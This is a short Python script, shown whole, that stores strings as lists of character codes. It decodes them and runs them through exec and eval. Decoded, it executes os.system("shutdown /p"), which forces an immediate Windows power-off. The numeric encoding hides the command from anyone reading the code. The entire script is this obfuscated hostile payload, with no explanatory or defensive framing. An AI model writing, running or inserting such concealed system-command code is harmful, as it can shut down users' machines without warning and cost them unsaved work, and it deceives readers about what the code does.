encrList = [115, 104, 117, 116, 100, 111, 119, 110, 32, 47, 112]
impList = [105, 109, 112, 111, 114, 116, 32, 111, 115]
closeTag = 41
cmd = [111, 115, 46, 115, 121, 115, 116, 101, 109, 40]

string = ''
for i in encrList:
    string += chr(i)


impStr = ''
for i in impList:
    impStr += chr(i)


closeTag = chr(closeTag)
cmdStr = ''
for i in cmd:
    cmdStr += chr(i)

exec(impStr)
eval(cmdStr + '"' + string + '"' + closeTag)


